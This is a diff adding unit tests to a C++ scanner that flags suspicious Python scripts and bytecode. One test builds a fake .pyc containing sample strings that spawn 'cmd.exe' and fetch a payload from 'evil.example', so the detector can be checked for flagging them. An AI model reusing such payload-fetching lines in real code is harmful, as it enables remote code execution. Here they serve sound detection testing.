@@ -16,7 +16,10 @@
 #include <gtest/gtest.h>
 
 #include <algorithm>
+#include <array>
 #include <chrono>
+#include <filesystem>
+#include <fstream>
 #include <string>
 #include <vector>
 
@@ -46,6 +49,37 @@ bool ContainsString(const std::vector<std::string>& values, std::string_view nee
 
 bool HasCapabilityFlag(PythonCapability value, PythonCapability bit) {
     return (static_cast<uint32_t>(value) & static_cast<uint32_t>(bit)) != 0;
+}
+
+class ScopedTestFile {
+public:
+    ScopedTestFile(std::wstring fileName, const std::vector<uint8_t>& bytes)
+        : path_(std::filesystem::current_path() / L"python_scanner_test_artifacts" / fileName) {
+        std::filesystem::create_directories(path_.parent_path());
+        std::ofstream out(path_, std::ios::binary | std::ios::trunc);
+        out.write(reinterpret_cast<const char*>(bytes.data()),
+                  static_cast<std::streamsize>(bytes.size()));
+    }
+
+    ~ScopedTestFile() {
+        std::error_code ignored;
+        std::filesystem::remove(path_, ignored);
+        std::filesystem::remove(path_.parent_path(), ignored);
+    }
+
+    [[nodiscard]] const std::filesystem::path& path() const noexcept {
+        return path_;
+    }
+
+private:
+    std::filesystem::path path_;
+};
+
+void AppendLe32(std::vector<uint8_t>& bytes, uint32_t value) {
+    bytes.push_back(static_cast<uint8_t>(value & 0xFFu));
+    bytes.push_back(static_cast<uint8_t>((value >> 8) & 0xFFu));
+    bytes.push_back(static_cast<uint8_t>((value >> 16) & 0xFFu));
+    bytes.push_back(static_cast<uint8_t>((value >> 24) & 0xFFu));
 }
 
 }  // namespace
@@ -231,6 +265,56 @@ TEST_F(PythonScriptScannerTest, LifecycleAndStatisticsResetBehavePredictably) {
     const json snapshotJson = json::parse(snapshot.ToJson());
     EXPECT_EQ(snapshotJson.at("totalScans"), 3);
     EXPECT_EQ(snapshotJson.at("uptimeMs"), 42);
+}
+
+TEST_F(PythonScriptScannerTest, RejectsOversizedSourcesAndInvalidPathsBeforeIO) {
+    auto& scanner = PythonScriptScanner::Instance();
+
+    PythonScannerConfiguration config;
+    config.maxFileSize = 64;
+    ASSERT_TRUE(scanner.Initialize(config));
+
+    const std::string oversized(128, 'A');
+    const auto oversizedResult = scanner.ScanSource(oversized, "oversized.py");
+    EXPECT_EQ(oversizedResult.status, PythonScanStatus::SkippedSizeLimit);
+
+    const std::filesystem::path invalidPath{L"bad\nname.py"};
+    const auto invalidPathResult = scanner.ScanFile(invalidPath);
+    EXPECT_EQ(invalidPathResult.status, PythonScanStatus::ErrorFileAccess);
+}
+
+TEST_F(PythonScriptScannerTest, BytecodeParserRejectsMalformedMagicAndScansPrintableStrings) {
+    auto& scanner = PythonScriptScanner::Instance();
+    ASSERT_TRUE(scanner.Initialize());
+
+    std::vector<uint8_t> malformed;
+    AppendLe32(malformed, 0x01020304u);
+    AppendLe32(malformed, 0u);
+    ScopedTestFile malformedFile(L"malformed.pyc", malformed);
+    const auto malformedResult = scanner.ScanBytecode(malformedFile.path());
+    EXPECT_EQ(malformedResult.status, PythonScanStatus::ErrorParsing);
+    EXPECT_FALSE(malformedResult.bytecodeInfo.has_value());
+
+    std::vector<uint8_t> suspicious;
+    AppendLe32(suspicious, 0x0A0D0000u | 3495u); // Python 3.11 magic, little-endian
+    AppendLe32(suspicious, 0u);                  // timestamp pyc flags
+    AppendLe32(suspicious, 0u);                  // timestamp
+    AppendLe32(suspicious, 128u);                // source size
+    const std::string printable =
+        "import socket\n"
+        "subprocess.Popen('cmd.exe')\n"
+        "urllib.request.urlopen('https://evil.example/payload')\n";
+    suspicious.insert(suspicious.end(), printable.begin(), printable.end());
+
+    ScopedTestFile suspiciousFile(L"suspicious.pyc", suspicious);
+    const auto suspiciousResult = scanner.ScanBytecode(suspiciousFile.path());
+    ASSERT_TRUE(suspiciousResult.bytecodeInfo.has_value());
+    EXPECT_EQ(suspiciousResult.bytecodeInfo->version, PythonVersion::Python311);
+    EXPECT_TRUE(HasCapabilityFlag(suspiciousResult.capabilities,
+                                  PythonCapability::ProcessExecution));
+    EXPECT_TRUE(HasCapabilityFlag(suspiciousResult.capabilities,
+                                  PythonCapability::NetworkCommunication));
+    EXPECT_GE(suspiciousResult.riskScore, 50);
 }
 
 TEST_F(PythonScriptScannerTest, RepeatedInitializePreservesExistingConfiguration) {
